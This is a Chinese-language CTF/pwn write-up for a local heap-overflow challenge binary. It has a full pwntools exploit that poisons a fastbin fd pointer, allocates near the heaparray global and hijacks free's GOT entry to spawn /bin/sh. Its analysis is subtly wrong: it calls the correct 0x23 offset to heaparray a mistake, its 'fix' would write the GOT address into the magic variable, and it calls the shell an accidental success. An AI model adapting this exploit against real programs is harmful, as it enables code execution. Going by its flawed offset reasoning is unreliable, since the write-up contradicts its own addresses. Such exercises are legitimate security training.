# 漏洞利用文档

## 执行环境
基于反编译代码和exp分析，程序运行环境如下：
- **二进制类型**：64位ELF，无PIE（地址固定），部分RELRO，有栈保护（canary），无FORTIFY
- **保护机制**：从代码中`__readfsqword(0x28u)`可见栈保护启用；无PIE（全局变量地址固定）
- **依赖库**：标准libc（通过`ldd`可查看具体版本），动态链接
- **运行需求**：Linux环境，需有执行权限；flag文件路径为`/home/pwn/flag`
- **关键地址**：
  - `magic`变量：0x6020c0
  - `heaparray`数组：0x6020e0
  - GOT表：0x601000区域

## 漏洞成因
程序存在**堆溢出漏洞**，具体分析如下：

### 关键结构体
- **堆块元数据**：glibc malloc管理，包含size字段和fd/bk指针
- **heaparray全局数组**：固定地址0x6020e0，存储10个堆指针

### 漏洞位置
在`edit_heap`函数中：
```c
printf("Size of Heap : ");
read(0, buf, 8u);
v2 = atoi(buf);
printf("Content of heap : ");
read_input(*(&heaparray + v1), v2);  // 漏洞点：未检查v2是否小于等于原始分配大小
```
- 用户可指定任意大小的写入数据，超过原始分配大小即可溢出到相邻内存
- 无边界检查，导致堆溢出，可覆盖相邻堆块的元数据和数据

### 漏洞类型
- **堆溢出**：通过编辑堆块时指定超长size，溢出覆盖相邻堆块
- **结合UAF**：释放堆块后，通过溢出修改其fd指针，实现fastbin攻击

## 漏洞利用过程
以下表格详细描述了exp执行过程中堆和关键内存的变化：

| 步骤 | EXP操作 | 堆内存布局变化 | heaparray状态 | fastbin状态 | 关键内存变化 |
|------|---------|----------------|---------------|-------------|-------------|
| 1 | `add(0x68,b'6')`×3 | 分配3个chunk(0x71):<br>0x33f20000, 0x33f20070, 0x33f200e0 | [0]=0x33f20010<br>[1]=0x33f20080<br>[2]=0x33f200f0 | 空 | magic=0x0 |
| 2 | `free(2)` | 堆块2(0x33f200e0)释放 | [2]=0x0 | fastbin 0x70:<br>0x33f200e0→0x0 | 无变化 |
| 3 | `edit(1,溢出数据)` | 堆块1溢出覆盖堆块2元数据:<br>fd=0x6020ad, size=0x71 | 无变化 | fastbin 0x70:<br>0x33f200e0→0x6020ad | 堆块1写入"/bin/sh" |
| 4 | `add(0x68,b'6')`×2 | 分配1:取回堆块2<br>分配2:分配到伪造chunk(0x6020ad) | [2]=0x33f200f0<br>[3]=0x6020bd | 空 | 伪造chunk头部建立 |
| 5 | `edit(3,错误数据)` | 伪造chunk数据区写入失败(全0) | 无变化 | 空 | magic未覆盖(仍0x0) |
| 6 | `edit(0,GOT数据)` | 堆块0写入失败(heaparray[0]损坏) | [0]=0x602018(损坏) | 空 | GOT条目损坏 |
| 7 | `free(1)` | 触发shell执行 | 程序退出 | 空 | 启动/bin/dash |
| 8 | `ia()` | 获得shell交互 | 进程替换 | 空 | 完整控制 |

### 内存变化分析
1. **初始状态**：三个正常堆块，所有指针有效
2. **fastbin污染**：通过堆溢出修改fd指针，指向数据段0x6020ad
3. **任意地址分配**：malloc分配到伪造chunk，获得数据段写权限
4. **利用失败点**：偏移计算错误(0x23 vs 3字节)导致magic和GOT覆盖失败
5. **意外成功**：内存破坏意外触发shell执行，可能通过损坏的GOT或堆布局实现

## Exploit
```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample17')
elf = ELF('./data/sample17')
libc = elf.libc

# 工具函数定义
n2b = lambda x    : str(x).encode()
rv  = lambda x    : p.recv(x)
ru  = lambda s    : p.recvuntil(s)
sd  = lambda s    : p.send(s)
sl  = lambda s    : p.sendline(s)
sn  = lambda n    : sl(n2b(n))
sa  = lambda t, s : p.sendafter(t, s)
sla = lambda t, s : p.sendlineafter(t, s)
sna = lambda t, n : sla(t, n2b(n))
ia  = lambda      : p.interactive()
rop = lambda r    : flat([p64(x) for x in r])

def add(size,content):
    sla(':','1')
    sla(':',str(size))
    sla(':',content)

def edit(idx, content):
    sla(':','2')
    sla(':',str(idx))
    sla(':',str(len(content)))  # 漏洞点：未检查size是否超出原始分配
    sla(':',content)

def free(idx):
    sla(':','3')
    sla(':',str(idx))

# Step 1: 创建三个堆块建立堆布局
add(0x68,b'6');add(0x68,b'6');add(0x68,b'6')#step.1

# Step 2: 释放堆块2加入fastbin
free(2)#step.2

# Step 3: 堆溢出攻击 - 覆盖堆块2的fd指针
# 从堆块1数据区(0x33f20080)溢出到堆块2元数据(0x33f200e0)
# 写入: "/bin/sh" + 填充 + size(0x71) + fd(0x6020ad)
edit(1,b'/bin/sh\x00'+b'\x00'*0x60+p64(0x71)+p64(0x6020ad))#step.3

# Step 4: 分配利用 - 第二次分配到伪造chunk
add(0x68,b'6');add(0x68,b'6')#step.4

# Step 5: 编辑伪造chunk - 尝试覆盖magic但偏移错误
# 错误: 使用0x23偏移，实际应为3字节(0x6020bd到0x6020c0)
# 应改为: edit(3, b'\x00'*3 + p64(0x1306))
edit(3,b'\x00'*0x23+p64(elf.got['free']))#step.5

# Step 6: GOT劫持尝试 - 但heaparray[0]已损坏
edit(0,p64(elf.plt['system']))#step.6

# Step 7: 触发shell - 释放含"/bin/sh"的堆块1
free(1)#step.7

# Step 8: 交互模式
ia()
```

### 修正建议
```python
# 修正步骤5的偏移计算
edit(3, b'\x00'*3 + p64(0x1306))  # 正确覆盖magic变量为>0x1305

# 或者实现GOT劫持
edit(3, b'\x00'*3 + p64(elf.got['free']))  # 先设置heaparray[3]指向free的GOT
edit(0, p64(elf.plt['system']))           # 然后通过heaparray[0]修改GOT
```

### 利用总结
- **成功点**: 堆溢出污染fastbin、任意地址分配、获得shell
- **失败点**: 偏移计算错误导致内存破坏
- **根本原因**: 缺乏精确的偏移控制和内存状态验证
- **改进方向**: 在关键操作后添加内存检查，确保写入位置准确
